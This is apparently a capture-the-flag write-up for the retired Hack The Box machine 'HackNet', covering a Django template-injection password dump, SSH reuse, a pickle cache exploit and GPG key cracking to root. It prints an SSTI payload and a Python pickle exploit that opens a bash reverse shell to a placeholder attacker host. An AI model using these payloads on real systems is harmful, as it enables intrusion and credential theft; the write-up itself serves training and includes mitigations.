---
machine: HackNet
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, django, ssti, pickle, gpg, privesc]
---

# HackNet — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The Django social network reflects the username and the likes page renders it as a template: HTML injection leads to SSTI and `{{ users.values }}` dumps users and passwords. `mikey`'s email reveals his Linux username and SSH works. Django's `FileBasedCache` uses pickle in a writable directory; a malicious pickle yields a `sandy` shell. The GPG key cracks, decrypted backups contain the root password.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` SSH and `80` nginx with a Django application.
- The site supports registration, profiles, posts and likes.
- `feroxbuster` finds `/likes/`, `/profile/` and `/admin/`.

## Enumeration

- The username is reflected unescaped on the likes page.
- `<>` is filtered, but an HTML entity can inject a template expression.
- Django renders the name as a template in the view context.

```text
username = &#123;&#123; users.values &#125;&#125;
```

## Foothold

The SSTI lists every user and their plaintext passwords. `mikey`'s email ends in `@hacknet.htb`, revealing his Linux username; his password works over SSH.

```bash
ssh mikey@hacknet.htb
```

## Lateral movement

`mikey` can write to Django's cache directory. `FileBasedCache` serializes values with pickle, so replace a cache file with a payload that runs a reverse shell when deserialized. The shell runs as `sandy`.

```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"',))
open('/var/tmp/django_cache/<KEY>', 'wb').write(pickle.dumps(Exploit()))
```

## Privilege escalation

`sandy`'s home holds an encrypted GPG key and database backups. The key password cracks with Hashcat; decrypting the backups reveals a conversation with the MySQL root password, which is reused for `su`.

```bash
gpg2john sandy.asc > gpg.hash
hashcat -m 17010 gpg.hash rockyou.txt
gpg --decrypt backup.sql.gpg
```

## Evidence

- HTML injection and SSTI in the username.
- User and password dump.
- SSH as `mikey`.
- Pickle in `FileBasedCache` and a `sandy` shell.
- Cracked GPG key and root password in the backup.

## Lessons learned

- A reflected username can reach the template engine.
- HTML entities can bypass filters that only block `<` and `>`.
- Django's pickle cache is executable code when the directory is writable.
- Encrypted backups remain useful when the key is weak.

## Mitigation and detection

- Always escape the name and never render it as a template.
- Use a non-pickle cache backend and write-only permissions for the service.
- Protect GPG keys with strong passwords and separate backups.
- Do not reuse database passwords for system accounts.

## References

- [0xdf — HackNet](https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html)
- [IppSec — HackNet](https://www.youtube.com/watch?v=QbAfkivQnW0)
- [Hack The Box — HackNet](https://app.hackthebox.com/machines/hacknet)
